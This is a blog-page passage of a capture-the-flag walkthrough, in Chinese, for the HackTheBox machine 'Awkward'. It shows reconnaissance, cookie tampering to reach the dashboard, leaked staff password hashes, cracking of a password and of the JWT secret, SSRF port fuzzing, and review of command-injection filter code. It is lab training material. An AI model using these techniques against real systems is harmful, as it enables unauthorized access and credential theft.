<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="HackTheBox,Awkward">
    <meta name="description" content="HackTheBox-Awkward">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>HTB-Awkward | wa0er</title>
    <link rel="icon" type="image/png" href="/wa0er.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="wa0er" type="application/atom+xml">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>




<!-- 加载动画 -->


<body>
    <!-- 加载动画 -->
    

    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/wa0er.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">wa0er</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/wa0er.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">wa0er</div>
        <div class="logo-desc">
            
            Love and Share
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/wa0er" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Follow Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/wa0er" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Follow Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/cover.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">HTB-Awkward</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/LFI/">
                                <span class="chip bg-color">LFI</span>
                            </a>
                        
                            <a href="/tags/Nginx/">
                                <span class="chip bg-color">Nginx</span>
                            </a>
                        
                            <a href="/tags/JWT%E4%BC%AA%E9%80%A0/">
                                <span class="chip bg-color">JWT伪造</span>
                            </a>
                        
                            <a href="/tags/SSRF/">
                                <span class="chip bg-color">SSRF</span>
                            </a>
                        
                            <a href="/tags/awk%E5%91%BD%E4%BB%A4/">
                                <span class="chip bg-color">awk命令</span>
                            </a>
                        
                            <a href="/tags/sed%E5%91%BD%E4%BB%A4RCE/">
                                <span class="chip bg-color">sed命令RCE</span>
                            </a>
                        
                            <a href="/tags/mail%E5%91%BD%E4%BB%A4/">
                                <span class="chip bg-color">mail命令</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
                                靶机
                            </a>
                        
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/HackTheBox/" class="post-category">
                                HackTheBox
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-03-11
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2023-11-09
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    4.8k&nbsp;字
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    25 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>&nbsp;次
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="HTB-Awkward"><a href="#HTB-Awkward" class="headerlink" title="HTB-Awkward"></a>HTB-Awkward</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><ol>
<li>信息收集发现JWT和SSRF；</li>
<li>SSRF发现站点API；</li>
<li>审计API源码，发现可伪造JWT执行awk命令实现LFI拿到bean用户ssh；</li>
<li>连上ssh找到购物车源码，nginx敏感文件泄露找到admin账户；</li>
<li>审计购物车源码，发现删除购物车功能可利用sed命令实现RCE；</li>
<li>RCE反弹shell获取www-data用户权限；</li>
<li>执行pspy64发现mail命令及其目标文件leave_requests.csv；</li>
<li>利用mail命令和leave_requests.csv反弹shell获取root权限。</li>
</ol>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>Nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/桌面]
└─# nmap -sC -sV 10.10.11.185          
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-16 21:53 EST
Nmap scan report for 10.10.11.185
Host is up (0.35s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA)
|_  256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.48 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开放端口：22（SSH）、80（HTTP）</p>
<p>80端口开放，直接URL打开IP，跳转到hat-valley.htb，那就添加进本地hosts文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.185 hat-valley.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217110323853.png"></p>
<p>目录扫描</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dirsearch -u http://hat-valley.htb/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217111135831.png"></p>
<p>继续扫js目录</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dirsearch -u http://hat-valley.htb/js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217142128172.png"></p>
<p>app.js搜href，发现几个可疑目录<code>/dashboard</code>、<code>/leave</code>、<code>/hr</code>，依次打开，发现全部都会跳转到<code>/hr</code>，是个登录界面</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220101615666.png" style="zoom:67%;">

<p>随便试，都会报用户名或密码错误，用Burp抓包发现Cookie字段有<code>token=guest</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220102134970.png" alt="image-20230220102134970"></p>
<p>burp直接修改成<code>token=admin</code>或者<code>token=administrator</code>，重放请求包，还是不行</p>
<p>用插件Cookie Editor编辑token值为admin，刷新页面，发现页面跳转到<code>/dashboard</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220104116943.png"></p>
<p>或者也可以浏览器<code>F12</code>→<code>Storage</code>→<code>Cookies</code>修改、刷新页面，一样的效果</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220105152758.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220104309900.png"></p>
<p>打开左侧菜单栏【Leave Requests】页面，留意到所有的离开请求会由Christine审核，猜测Christine应该是个权限不小的账户</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221102637260.png"></p>
<p>然后在<code>F12</code>→<code>Network</code>→<code>XHR</code>（<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/send">XMLHttpRequest</a>）看到有两个api文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220105826149.png"></p>
<p>分别访问<code>http://hat-valley.htb/api/staff-details</code>和<code>http://hat-valley.htb/api/store-status</code>，<code>/api/store-status</code>页面没什么东西，<code>/api/staff-details</code>有<code>jwt malformed</code>报错信息</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220130856612.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">JsonWebTokenError: jwt malformed
    at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17)
    at /var/www/hat-valley.htb/server/server.js:151:30
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)
    at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)
    at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>jwt malformed</code>报错是因为前端上传token的时候没有进行非空验证，导致token传给了服务端，这样就和服务端生成的token重复了。那么我们用CookieEditor插件或者F12删除cookie的token字段，也就是删除cookie，刷新页面，可以看到有四个用户</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221100317693.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">username	"christine.wool"
password	"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649"
username	"christopher.jones"
password	"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1"
username	"jackson.lightheart"
password	"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436"
username	"bean.hill"
password	"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>目测是<code>64*4=256</code>位Hash，在线解一下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221101810630.png"></p>
<p>解出来一个用户</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">christopher.jones
chris123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>那么我们重新回到<code>http://hat-valley.htb/hr</code>页面，登录这个账户</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221103219519.png"></p>
<p>看到<code>Staff Details</code>，果然，前面的判断没错，Christine是CEO，权限不小，还有两个销售和一个系统管理员</p>
<p>并且拿到了JWT token</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303104140690.png"></p>
<p>用脚本把这个JWT token转换成john格式，然后用john工具破解</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py">https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py</a></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&gt; python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY3MDE3MTU3fQ.M5Yx5hMqtxf3hxrIJSjdLSdubkP6gFPtGzwsDDr7voI &gt; jwt_hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> jwt<span class="token punctuation">.</span>utils <span class="token keyword">import</span> base64url_decode
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> hexlify


<span class="token keyword">def</span> <span class="token function">jwt2john</span><span class="token punctuation">(</span>jwt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Convert signature from base64 to hex, and separate it from the data by a #
    so that John can parse it.
    """</span>
    jwt_bytes <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>
    parts <span class="token operator">=</span> jwt_bytes<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span>

    data <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">b'.'</span> <span class="token operator">+</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    signature <span class="token operator">=</span> hexlify<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token string">b'#'</span> <span class="token operator">+</span> signature<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: %s JWT"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        john <span class="token operator">=</span> jwt2john<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>john<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&gt; john -w=/usr/share/wordlists/rockyou.txt jwt_hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303115143339.png"></p>
<p>获取到JWT token的secret值为<code>123beany123</code>，用<code>JWT Debugger</code>尝试，暂时没发现什么</p>
<h2 id="三、SSRF"><a href="#三、SSRF" class="headerlink" title="三、SSRF"></a>三、SSRF</h2><p>想起刚才发现的另一个API，<code>api/store-status?url="http://store.hat-valley.htb"</code>，可能存在SSRF</p>
<p>尝试<code>http://127.0.0.1:80</code>，被重定向到<code>http://store.hat-valley.htb</code>，证实存在SSRF</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">http://hat-valley.htb/api/store-status?url="http://127.0.0.1:80"--&gt;http://store.hat-valley.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"' -fs 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303133754827.png"></p>
<p>三个端口80、3002、8080</p>
<p>3002是API文件，记录了站点的API信息及其源码，API名称如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Login (/api/login)
Submit Leave (/api/submit-leave)
All Leave (/api/all-leave)
Store Status (/api/store-status)
Staff Details (/api/staff-details)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303133933056.png"></p>
<p>8080页面空白，看源码发现hat-valley不能正常工作，要求开启JavaScript才能正常工作，没什么用</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303134214112.png"></p>
<h2 id="四、LFI"><a href="#四、LFI" class="headerlink" title="四、LFI"></a>四、LFI</h2><p>在其中一个API源码发现漏洞点，在28行exec函数里，有用户可控的参数user，通过操纵参数user，执行<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-awk.html">awk命令</a>读取文件（PS：题目名称Awkward原来体现在这）。而user值的获取，往前追溯代码，发现是通过decodedToken，然后取username字段得到的。</p>
<p>再往前追溯到头，发现是如下图所示的传递链，TOKEN_SECRET前面已经获得，值为<code>123beany123</code>，所以我们就可以通过JWT伪造请求头中Cookie字段的token值，从而操纵user值读取文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303161247753.png"></p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl">app<span class="token dyadic-operator operator">.</span>get<span class="token punctuation">(</span><span class="token string">'/api/all-leave'</span><span class="token function">,</span> <span class="token punctuation">(</span>req<span class="token function">,</span> res<span class="token punctuation">)</span> <span class="token function">=</span><span class="token function">&gt;</span> <span class="token dfn builtin">{</span>
  const user_token <span class="token function">=</span> req<span class="token dyadic-operator operator">.</span>cookies<span class="token dyadic-operator operator">.</span>token
  var authFailed <span class="token function">=</span> false
  var user <span class="token function">=</span> null
  if<span class="token punctuation">(</span>user_token<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    const decodedToken <span class="token function">=</span> jwt<span class="token dyadic-operator operator">.</span>verify<span class="token punctuation">(</span>user_token<span class="token function">,</span> TOKEN_SECRET<span class="token punctuation">)</span>
    if<span class="token punctuation">(</span><span class="token function">!</span>decodedToken<span class="token dyadic-operator operator">.</span>username<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      authFailed <span class="token function">=</span> true
    <span class="token dfn builtin">}</span>
    else <span class="token dfn builtin">{</span>
      user <span class="token function">=</span> decodedToken<span class="token dyadic-operator operator">.</span>username
    <span class="token dfn builtin">}</span>
  <span class="token dfn builtin">}</span>
  if<span class="token punctuation">(</span>authFailed<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>json<span class="token punctuation">(</span><span class="token dfn builtin">{</span>Error<span class="token dfn builtin">:</span> "Invalid Token"<span class="token dfn builtin">}</span><span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>
  if<span class="token punctuation">(</span><span class="token function">!</span>user<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Invalid user"<span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>
  const bad <span class="token function">=</span> <span class="token punctuation">[</span>"<span class="token punctuation">;</span>"<span class="token function">,</span>"<span class="token monadic-operator operator">&amp;</span>"<span class="token function">,</span>"<span class="token function">|</span>"<span class="token function">,</span>"<span class="token function">&gt;</span>"<span class="token function">,</span>"<span class="token function">&lt;</span>"<span class="token function">,</span>"<span class="token function">*</span>"<span class="token function">,</span>"<span class="token function">?</span>"<span class="token function">,</span>"`"<span class="token function">,</span>"$"<span class="token function">,</span>"<span class="token punctuation">(</span>"<span class="token function">,</span>"<span class="token punctuation">)</span>"<span class="token function">,</span>"<span class="token dfn builtin">{</span>"<span class="token function">,</span>"<span class="token dfn builtin">}</span>"<span class="token function">,</span>"<span class="token punctuation">[</span>"<span class="token function">,</span>"<span class="token punctuation">]</span>"<span class="token function">,</span>"<span class="token function">!</span>"<span class="token function">,</span>"<span class="token constant">#</span>"<span class="token punctuation">]</span>

  const badInUser <span class="token function">=</span> bad<span class="token dyadic-operator operator">.</span>some<span class="token punctuation">(</span>char <span class="token function">=</span><span class="token function">&gt;</span> user<span class="token dyadic-operator operator">.</span>includes<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

